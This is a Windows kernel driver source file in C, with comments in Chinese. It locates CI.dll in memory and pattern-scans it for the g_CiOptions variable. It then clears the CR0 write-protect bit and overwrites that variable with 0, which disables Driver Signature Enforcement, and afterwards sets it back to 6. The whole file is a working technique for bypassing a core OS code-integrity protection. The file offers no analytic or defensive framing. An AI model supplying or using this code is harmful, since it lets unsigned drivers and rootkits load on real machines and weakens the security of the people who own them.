#include "ntddk.h"  //加载ntddk.h即可.我的DriverUnload没在这个文件.所以包含了一下
#include <wdm.h>

//KLDR_DATA_TABLE_ENTRY

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union {
		LIST_ENTRY HashLinks;
		struct {
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union {
		struct {
			ULONG TimeDateStamp;
		};
		struct {
			PVOID LoadedImports;
		};
	};
}LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

VOID IteratorModule(PDRIVER_OBJECT pDriverObj)
{
	PLDR_DATA_TABLE_ENTRY pLdr = NULL;
	PLIST_ENTRY pListEntry = NULL;
	PLIST_ENTRY pCurrentListEntry = NULL;

	PLDR_DATA_TABLE_ENTRY pCurrentModule = NULL;
	pLdr = (PLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
	pListEntry = pLdr->InLoadOrderLinks.Flink;
	pCurrentListEntry = pListEntry->Flink;

	while (pCurrentListEntry != pListEntry) //前后不相等
	{
		//获取LDR_DATA_TABLE_ENTRY结构
		pCurrentModule = CONTAINING_RECORD(pCurrentListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (pCurrentModule->BaseDllName.Buffer != 0)
		{
			DbgPrint("ModuleName = %wZ ModuleBase = %p ModuleEndBase = %p\r\n",
				pCurrentModule->BaseDllName,
				pCurrentModule->DllBase,
				(LONGLONG)pCurrentModule->DllBase + pCurrentModule->SizeOfImage);
		}
		pCurrentListEntry = pCurrentListEntry->Flink;
	}
}

LONGLONG GetModuleBaseByName(PDRIVER_OBJECT pDriverObj, UNICODE_STRING ModuleName)
{
	PLDR_DATA_TABLE_ENTRY pLdr = NULL;
	PLIST_ENTRY pListEntry = NULL;
	PLIST_ENTRY pCurrentListEntry = NULL;

	PLDR_DATA_TABLE_ENTRY pCurrentModule = NULL;
	pLdr = (PLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
	pListEntry = pLdr->InLoadOrderLinks.Flink;
	pCurrentListEntry = pListEntry->Flink;

	while (pCurrentListEntry != pListEntry) //前后不相等
	{
		//获取LDR_DATA_TABLE_ENTRY结构
		pCurrentModule = CONTAINING_RECORD(pCurrentListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (pCurrentModule->BaseDllName.Buffer != 0)
		{
			UNICODE_STRING uCmp1 = RTL_CONSTANT_STRING(L"HelloWorld");
			UNICODE_STRING uCmp2 = RTL_CONSTANT_STRING(L"HelloWorld");
			if (RtlCompareUnicodeString(&pCurrentModule->BaseDllName, &ModuleName, TRUE) == 0)
			{
				DbgPrint("ModuleName = %wZ ModuleBase = %p ModuleEndBase = %p\r\n",
					pCurrentModule->BaseDllName,
					pCurrentModule->DllBase,
					(LONGLONG)pCurrentModule->DllBase + pCurrentModule->SizeOfImage);
				return (LONGLONG)pCurrentModule->DllBase;
			}

		}
		pCurrentListEntry = pCurrentListEntry->Flink;
	}
	return 0;
}

typedef struct _BASEMANGER
{
	LONGLONG StartBase;
	LONGLONG EndBase;
}BASEMANGER, * PBASEMANGER;

BASEMANGER GetModuleBaseByNames(PDRIVER_OBJECT pDriverObj, UNICODE_STRING ModuleName)
{
	PLDR_DATA_TABLE_ENTRY pLdr = NULL;
	PLIST_ENTRY pListEntry = NULL;
	PLIST_ENTRY pCurrentListEntry = NULL;

	PLDR_DATA_TABLE_ENTRY pCurrentModule = NULL;
	pLdr = (PLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
	pListEntry = pLdr->InLoadOrderLinks.Flink;
	pCurrentListEntry = pListEntry->Flink;
	BASEMANGER BaseManger = { 0 };
	while (pCurrentListEntry != pListEntry) //前后不相等
	{
		//获取LDR_DATA_TABLE_ENTRY结构
		pCurrentModule = CONTAINING_RECORD(pCurrentListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (pCurrentModule->BaseDllName.Buffer != 0)
		{
			UNICODE_STRING uCmp1 = RTL_CONSTANT_STRING(L"HelloWorld");
			UNICODE_STRING uCmp2 = RTL_CONSTANT_STRING(L"HelloWorld");
			if (RtlCompareUnicodeString(&pCurrentModule->BaseDllName, &ModuleName, TRUE) == 0)
			{

				DbgPrint("ModuleName = %wZ ModuleBase = %p ModuleEndBase = %p\r\n",
					pCurrentModule->BaseDllName,
					pCurrentModule->DllBase,
					(LONGLONG)pCurrentModule->DllBase + pCurrentModule->SizeOfImage);

				BaseManger.StartBase = (LONGLONG)pCurrentModule->DllBase;
				BaseManger.EndBase = (LONGLONG)pCurrentModule->DllBase + pCurrentModule->SizeOfImage;
				return BaseManger;
			}

		}
		pCurrentListEntry = pCurrentListEntry->Flink;
	}
	BaseManger.StartBase = 0;
	BaseManger.EndBase = 0;
	return BaseManger;
}





//核心实现代码
DWORD64 g_CiOptionsAddress;
int g_CiOptions = 6;



KIRQL  WPOFFx64()
{
	KIRQL  irql = KeRaiseIrqlToDpcLevel();
	UINT64  cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	_disable();
	__writecr0(cr0);
	return  irql;
}



KIRQL DisableMemProtected()
{
	KIRQL  irql = KeRaiseIrqlToDpcLevel();
	UINT64  cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	_disable();
	__writecr0(cr0);
	return  irql;
}

void EnbaleMemProtected(KIRQL irql)
{
	UINT64  cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
	KeLowerIrql(irql);
}
BOOLEAN DisableDse(DWORD64 CiStartAddress, DWORD64 CiEndAddress)
{
	UNICODE_STRING FunctionName = RTL_CONSTANT_STRING(L"PsGetCurrentProcess");
	DWORD64 PsGetCurrentProcessAddress = (DWORD64)MmGetSystemRoutineAddress(&FunctionName);
	DWORD64 SerchAddress = CiStartAddress;
	DWORD64 Address;
	KIRQL Myirql;
	int nCount = 0;
	int isFind = 0;
	int i = 0;
	int isRead = 1;
	if (SerchAddress == 0)
	{
		return 0;
	}
	__try
	{
		KIRQL irql = KeRaiseIrqlToDpcLevel();
		while (SerchAddress++)
		{
			if (SerchAddress + 2 > CiEndAddress)
			{
				break;
			}

			isRead = 1;
			for (i = 0; i < 2; i++)
			{
				if (MmIsAddressValid((PDWORD64)SerchAddress + i) == FALSE)
				{
					isRead = 0;
					break;
				}
			}

			if (isRead == 1)
			{
				if (*(PUSHORT)(SerchAddress) == 0x15ff)
				{
					Address = SerchAddress + *(PLONG)(SerchAddress + 2) + 6;
					if (MmIsAddressValid((PDWORD64)Address))
					{
						if (*(PDWORD64)Address == PsGetCurrentProcessAddress)
						{
							while (nCount < 100)
							{
								nCount++;
								SerchAddress--;
								if (*(PUSHORT)(SerchAddress) == 0x0d89)
								{
									isFind = 1;
									break;
								}
							}
							break;
						}
					}

				}
			}
		}
		KeLowerIrql(irql);
	}
	__except (1)
	{
		DbgPrint("搜索数据失败!");
	}
	if (isFind == 1)
	{
		//DbgPrint("SerchAddress：%p\n", SerchAddress);
		g_CiOptionsAddress = SerchAddress + *(PLONG)(SerchAddress + 2) + 6;
		g_CiOptions = *(PLONG)g_CiOptionsAddress;
		DbgPrint("地址：%p 初始化值数据：%08X\n", g_CiOptionsAddress, g_CiOptions);
		Myirql = DisableMemProtected();
		*(PLONG)g_CiOptionsAddress = 0; //DisableDse 修改为0即可.
		DbgPrint("地址：%p 修改数据为：%08X\n", g_CiOptionsAddress, *(PLONG)g_CiOptionsAddress);
		EnbaleMemProtected(Myirql);
		return TRUE;
	}
	else
	{
		DbgPrint("搜索数据失败！\n");
		return FALSE;
	}
}
void EnbalDse()  //开启DSE保护
{
	KIRQL Myirql;
	Myirql = DisableMemProtected();
	*(PLONG)g_CiOptionsAddress = 6; //DisableDse 修改为6即可.
	DbgPrint("开启签名验证成功.值修改为 %d \r\n", *(PLONG)g_CiOptionsAddress);
	EnbaleMemProtected(Myirql);

}
VOID DriverUnLoad(_In_ struct _DRIVER_OBJECT* DriverObject) {

}


NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegPath)
{
	ULONG iCount = 0;
	NTSTATUS ntStatus;
	UNICODE_STRING uModuleName;
	BASEMANGER Base = { 0 };
	RtlInitUnicodeString(&uModuleName, L"CI.dll");
	pDriverObj->DriverUnload = DriverUnLoad;

	Base = GetModuleBaseByNames(pDriverObj, uModuleName);
	if (Base.StartBase != 0 && Base.EndBase != 0)
	{
		DisableDse(Base.StartBase, Base.EndBase);//传入CI基址 CICiEndAddress
		EnbalDse();                            //关闭DSE
	}




	return STATUS_SUCCESS;
}